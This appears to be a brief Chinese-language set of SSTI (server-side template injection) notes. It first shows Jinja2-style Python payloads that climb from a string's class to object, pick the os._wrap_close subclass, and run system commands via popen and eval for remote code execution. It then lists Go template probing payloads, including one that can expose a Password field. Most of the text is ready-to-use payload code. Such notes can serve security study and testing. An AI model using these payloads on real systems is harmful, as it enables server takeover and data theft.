利用危险类

利用<class ‘object’>进行注入

[]

并用 base 或 mro 找到<class ‘object’>

{{''.\_\_class\_\_.\_\_mro\_\_[2]}}// <class 'object'>

使用 subclasses 找到危险类

{{''.\_\_class\_\_.\_\_bases\_\_[0].\_\_subclasses\_\_()[?]}}

在？里填数字可以得到 对应的类，我们需要寻找危险类，它们能执行危险函数。
这里使用 os._wrap_close
跑脚本

拿到危险类后就可以随意构造了
这里跑出来值为 127

{{ ''.__class__.__bases__[0].__subclasses__()[127]('', 'w').write('Hello') }}

#RCE
{{''.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['popen']('ls').read()}}
{{''.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__.eval("__import__('os').popen('ls').read()")}}

在 Go 的模板引擎中，可以通过特定的有效负载来确认其使用情况：

  • {{ . }}：显示数据结构输入。例如，如果具有 Password attribute 时， {{ .Password }} 可能会暴露它。

  • {{printf “%s” “ssti” }}：应显示字符串 “ssti”。

  • {{html “ssti”}}、 {{js “ssti”}}：这些有效负载应返回 “ssti” ，而不附加 “html” 或 “js”
